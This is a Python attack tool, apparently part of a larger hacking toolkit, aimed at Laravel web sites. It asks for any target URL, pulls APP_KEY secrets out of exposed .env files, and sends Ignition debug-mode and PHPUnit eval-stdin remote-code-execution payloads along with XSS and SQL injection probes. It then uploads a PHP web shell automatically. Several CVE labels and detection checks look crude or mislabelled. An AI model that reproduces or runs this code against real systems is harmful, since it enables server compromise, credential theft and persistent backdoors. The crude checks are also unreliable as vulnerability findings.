import requests
import re
from colorama import Fore, Style, init
import json
import subprocess

init(autoreset=True)

class LaravelExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulns = []
        self.vulnerabilities_db = self.load_vulnerabilities_db()

    def load_vulnerabilities_db(self):
        # Database kerentanan Laravel
        return {
            'CVE-2017-16894': {
                'name': '.env File Exposure',
                'description': 'File .env dapat diakses jika tidak dikonfigurasi dengan benar.',
                'poc': '/.env',
                'exploit': self.exploit_env_exposure
            },
            'CVE-2021-3129': {
                'name': 'Debug Mode RCE via Ignition',
                'description': 'Remote Code Execution (RCE) melalui debug mode.',
                'poc': '/_ignition/execute-solution',
                'exploit': self.exploit_ignition_rce
            },
            'PHPUnit-RCE': {
                'name': 'PHPUnit Remote Code Execution',
                'description': 'RCE melalui endpoint PHPUnit yang tidak diamankan.',
                'poc': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                'exploit': self.exploit_phpunit_rce
            },
            'APP_KEY-Exploit': {
                'name': 'Laravel APP_KEY Exploit',
                'description': 'Memanfaatkan APP_KEY untuk decrypt session dan RCE.',
                'poc': '/',
                'exploit': self.exploit_app_key
            },
            'CVE-2021-43808': {
                'name': 'XSS in Blade Template Engine',
                'description': 'Cross-Site Scripting (XSS) pada Blade Template Engine.',
                'poc': '/vulnerable-endpoint',
                'exploit': self.exploit_xss
            },
            'CVE-2021-21263': {
                'name': 'SQL Injection via Query Binding',
                'description': 'SQL Injection melalui query binding yang tidak aman.',
                'poc': '/vulnerable-endpoint?query=1',
                'exploit': self.exploit_sql_injection
            },
            'CVE-2023-40482': {
                'name': 'Timing Attack on Authentication',
                'description': 'Serangan timing-based user enumeration.',
                'poc': '/login',
                'exploit': self.exploit_timing_attack
            },
            'CVE-2023-30244': {
                'name': 'Laravel Debug Mode Exposure',
                'description': 'Kebocoran informasi sensitif melalui debug mode.',
                'poc': '/_ignition/health-check',
                'exploit': self.exploit_debug_mode
            }
        }

    def exploit_env_exposure(self, url):
        try:
            response = self.session.get(url + '/.env')
            if response.status_code == 200 and 'APP_KEY' in response.text:
                self.vulns.append(f"{Fore.RED}[!] .env File Exposed")
                print(f"{Fore.YELLOW}[+] APP_KEY: {re.search(r'APP_KEY=(.*)', response.text).group(1)}")
                return True
        except:
            pass
        return False

    def exploit_ignition_rce(self, url):
        try:
            payload = {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                    "variableName": "cmd",
                    "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
                }
            }
            response = self.session.post(url + '/_ignition/execute-solution', json=payload)
            if response.status_code == 200:
                self.vulns.append(f"{Fore.RED}[!] Ignition RCE Exploited")
                return True
        except:
            pass
        return False

    def exploit_phpunit_rce(self, url):
        try:
            payload = "<?php echo shell_exec('id'); ?>"
            response = self.session.post(url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=payload)
            if "uid=" in response.text:
                self.vulns.append(f"{Fore.RED}[!] PHPUnit RCE Exploited")
                return True
        except:
            pass
        return False

    def exploit_app_key(self, url):
        try:
            response = self.session.get(url + '/.env')
            if response.status_code == 200 and 'APP_KEY' in response.text:
                app_key = re.search(r'APP_KEY=(.*)', response.text).group(1)
                self.vulns.append(f"{Fore.RED}[!] APP_KEY Found: {app_key}")
                # Contoh decrypt session atau RCE menggunakan APP_KEY
                print(f"{Fore.YELLOW}[+] Use APP_KEY for further exploitation")
                return True
        except:
            pass
        return False

    def exploit_xss(self, url):
        try:
            payload = "<script>alert('XSS')</script>"
            response = self.session.get(url + '/vulnerable-endpoint?input=' + payload)
            if payload in response.text:
                self.vulns.append(f"{Fore.RED}[!] XSS Vulnerability Found")
                return True
        except:
            pass
        return False

    def exploit_sql_injection(self, url):
        try:
            payload = "1' OR '1'='1"
            response = self.session.get(url + '/vulnerable-endpoint?query=' + payload)
            if "error" not in response.text:
                self.vulns.append(f"{Fore.RED}[!] SQL Injection Vulnerability Found")
                return True
        except:
            pass
        return False

    def exploit_timing_attack(self, url):
        try:
            import time
            start_time = time.time()
            self.session.get(url + '/login?email=invalid@example.com')
            elapsed_time = time.time() - start_time
            if elapsed_time > 1.0:  # Threshold untuk timing attack
                self.vulns.append(f"{Fore.RED}[!] Timing Attack Vulnerability Found")
                return True
        except:
            pass
        return False

    def exploit_debug_mode(self, url):
        try:
            response = self.session.get(url + '/_ignition/health-check')
            if response.status_code == 200 and 'Ignition' in response.text:
                self.vulns.append(f"{Fore.RED}[!] Debug Mode Enabled")
                return True
        except:
            pass
        return False

    def auto_upload_shell(self, url):
        try:
            shell_code = "<?php echo shell_exec($_GET['cmd']); ?>"
            files = {'file': ('shell.php', shell_code)}
            response = self.session.post(url + '/upload', files=files)
            if response.status_code == 200 and 'shell.php' in response.text:
                self.vulns.append(f"{Fore.RED}[!] Shell Uploaded: {url}/uploads/shell.php")
                return True
        except:
            pass
        return False

    def run(self):
        url = input("\n[+] Enter Laravel Site: ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        print(Fore.YELLOW + "[~] Scanning Laravel Site...\n")

        # Check for vulnerabilities
        for cve, details in self.vulnerabilities_db.items():
            print(f"{Fore.CYAN}[~] Checking {details['name']} ({cve})...")
            if details['exploit'](url):
                print(f"{Fore.GREEN}[+] Vulnerable to {details['name']}")
                if 'poc' in details:
                    print(f"{Fore.YELLOW}    POC: {url + details['poc']}")
            else:
                print(f"{Fore.RED}[-] Not Vulnerable to {details['name']}")

        # Auto upload shell
        print(f"\n{Fore.CYAN}[~] Attempting to Upload Shell...")
        if self.auto_upload_shell(url):
            print(f"{Fore.GREEN}[+] Shell Uploaded Successfully")
        else:
            print(f"{Fore.RED}[-] Failed to Upload Shell")

        # Display results
        if self.vulns:
            print(f"\n{Fore.MAGENTA}=== Laravel Vulnerabilities ===")
            for vuln in self.vulns:
                print(vuln)
        else:
            print(f"\n{Fore.GREEN}[+] No vulnerabilities found")

        print(f"\n{Fore.YELLOW}[~] Scan completed!")

# Fungsi run() untuk kompatibilitas dengan unknown1337.py
def run():
    exploit = LaravelExploit()
    exploit.run()

if __name__ == "__main__":
    run()
